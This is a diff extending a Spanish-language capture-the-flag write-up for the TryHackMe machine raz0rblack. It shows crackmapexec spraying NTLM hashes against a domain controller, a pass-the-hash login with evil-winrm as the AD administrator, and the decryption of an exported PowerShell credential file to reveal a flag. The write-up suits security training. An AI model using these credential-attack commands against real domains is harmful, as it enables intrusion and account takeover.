@@ -373,3 +373,79 @@ Y ahora busco el hash del usuario administrador de AD, lvetrova.
 A primera vista no lo encuentro. Y con grep tampoco.
 Voy a probar por fuerza bruta.
 Le doy el archivo de hashes a deepseek y le digo que me saque solo los hashes ntlm. Y lo paso al archivo hashes.txt.
+
+//Al comenzar el ataque, la máquina dejo de responder asique la tuve que reiniciar.
+Comienzo el ataque. Debo decir que me di cuenta de que habia muchos hashes repetidos en el archivo inicial, asique he eliminado duplicados y he hecho un sort.
+ crackmapexec smb 10.130.184.134 -u lvetrova -H /home/mksk/cosasctf/hashes.txt
+SMB         10.130.184.134  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:0017321df03a5ac921845fc8f504114d STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:0021a7a05231b70f2443a48f5d005abf STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:0152128356d8c6f7be3d273dbad4623d STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:015d595770f057132b0ba3ea3aaf5eac STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:016eccaa9987966a9e7698b3323235b3 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:018ca8435cdf35745d6fc1f7998b38f0 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:01fc6c67acf68e117f540c7e161aed4e STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:0259149f3228f53180ec8c33e6c96cc8 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:02d6534880b50e5348f87027f422d345 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:031bc818a8dd65e7972161851733c25c STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:0344f5785f5f559663201a2f460214c5 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:034ff06d389d1d6f0f13cd02a4b4925e STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:03f6e36c1ecb39e9dab2b7876ab55325 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:041192733c4a6548ee21f00e17b5181f STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:042475001a39eca2037c27eebdc0176c STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:044ca20015d4e6a6e6e52e7b029216da STATUS_LOGON_FAILURE 
+*************************************************************************************************************************************
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:f0c00515468fb790887babb7d41526a4 STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:f11e51706cc5312deb1b2ca54f70a8ea STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:f141789d54a808f6ddbd6a983cbc6caa STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:f15bf5d56599843175fa1375a82d74de STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:f17ba50e3fb891c5a1733c933abda51a STATUS_LOGON_FAILURE 
+SMB         10.130.184.134  445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
+
+Me ha salido un poco mal lo de hacer el sort. Pero bueno, ya tenemos el hash de lvetrova. Admin de AD.
+
+Consigo loguearme con evil-winrm y el hash.
+evil-winrm -i 10.130.184.134 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
+
+Buscando como seguir escalando privilegios encuentro lo siguiente.
+*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
+*Evil-WinRM* PS C:\Users\lvetrova> ls
+
+
+    Directory: C:\Users\lvetrova
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:14 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
+
+*Evil-WinRM* PS C:\Users\lvetrova> type lvetrova.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Your Flag is here =&gt;</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+ Y dentro de ese archivo hay un campo con lo que parece un hash. Indicando que es una flag.
+
+Investigando un poco, veo que es un archivo de powershell exportado. Y ejecuto los siguientes comandos para conseguir la flag.
+*Evil-WinRM* PS C:\Users\lvetrova> $cred = Import-CliXml -Path C:\Users\lvetrova\lvetrova.xml //Carga el archivo
+*Evil-WinRM* PS C:\Users\lvetrova> $cred.GetNetworkCredential().Password //consigue la flag
+THM{6943***************51fe4} //flag de lvetrova
